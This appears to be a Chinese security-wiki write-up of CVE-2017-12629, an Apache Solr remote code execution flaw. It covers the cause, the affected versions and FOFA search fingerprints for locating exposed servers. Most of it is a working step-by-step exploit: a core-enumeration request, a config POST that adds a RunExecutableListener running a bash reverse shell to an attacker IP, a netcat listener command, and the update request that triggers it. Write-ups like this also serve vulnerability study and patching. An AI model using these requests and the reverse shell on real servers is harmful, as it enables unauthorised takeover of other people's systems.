

# CVE-2017-12629 | Apache Solr < 7.1.0 存在远程代码执行漏洞



## 0x00 漏洞说明



在 `Apache Solr < 7.1.0` |` Apache Lucene < 7.1.0` 可运行 SolrCloud 和 StandaloneServer 两种模式，当以 SolrCloud 模式运行时，可通过 Configset API  操作  `Configsets`，包括创建、删除等。对于通过  Configset API  执行 UPLOAD 时，如果启用了身份验证**（默认未开启）**，且该请求通过了身份验证，则 Solr 会为该 `configset`  的设置`trusted`，否则该配置集不会被信任，**不被信任的  `configset`  无法创建 `collection` 。**



**和远程命令执行漏洞（RCE）**：

RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。



## 0x01 影响版本



-  <  `Apache Solr 7.1.0` 
-  <  `Apache Lucene 7.1.0`



## 0x02 漏洞成因



1. Apache Solr后端在处理的时候没有对用户输入的指令做严格的判断以及过滤。直接拼接，导致远程代码/命令执行。
2. 当攻击者通过 UPLOAD 上传 `configset`  后，再基于此`configsetCREATE configset` 时，Solr 不会为这个新的 `configset` 进行信任检查，导致可以使用未经信任检查的新 `configset` 创建 `collection`



## 0x03 漏洞指纹



fofa:

```
app="apache-Solr"
title="Solr Admin"
```



## 0x04 详细利用过程



**首先获取core参数**



```json
http://xxxx:8983/solr/admin/cores?indexInfo=false&wt=json
```



返回结果:

```json
{
    "responseHeader": {
        "status": 0,
        "QTime": 0
    },
    "initFailures": {},
    "status": {
        "demo": {
            "name": "demo", //core名称
            "instanceDir": "/opt/solr/server/solr/demo",
            "dataDir": "/opt/solr/server/solr/demo/data/",
            "config": "solrconfig.xml",
            "schema": "managed-schema",
            "startTime": "2022-03-19T11:53:01.190Z",
            "uptime": 199562
        }
    }
}
```





**首先创建一个listener，其中设置exe的值为我们想执行的命令，args的值是命令参数** (URL路径中包含core名称)



```json
POST:http://ip:8983/solr/demo/config HTTP/1.1

body:
{
    "add-listener":
    {
        "event":"postCommit",
        "name":"RCETEST", //name可以随便修改，但不能重复
        "class":"solr.RunExecutableListener",
        "exe":"bash",	//执行的命令
        "dir":"/bin/", //目录
        "args":["-c","bash -i >& /dev/tcp/ip/6666 0>&1"]		//参数
    }
}
```



VPS启动监听

```
nc -lvvp 6666
```







**然后进行update操作，触发刚才添加的listener：**



```json
POST:http://ip:8983/solr/demo/update


body:

[{"id":"RCETEST"}]


这里需要注意！

http Headers 必须添加Content-Type: application/json
```



等待大概1分钟



## 0x05 扩展链接



[NVD CVE-2017-12629 Detai](https://nvd.nist.gov/vuln/detail/CVE-2017-12629) 



[CVE-2017-12629 - Apache Solr XXE & RCE 漏洞分析](https://paper.seebug.org/425/)



[Apache Solr 远程命令执行漏洞（CVE-2017-12629）](https://www.linuxlz.com/aqld/2057.html)



## 0x06 联系方式



作者 : BitWiki支持团队
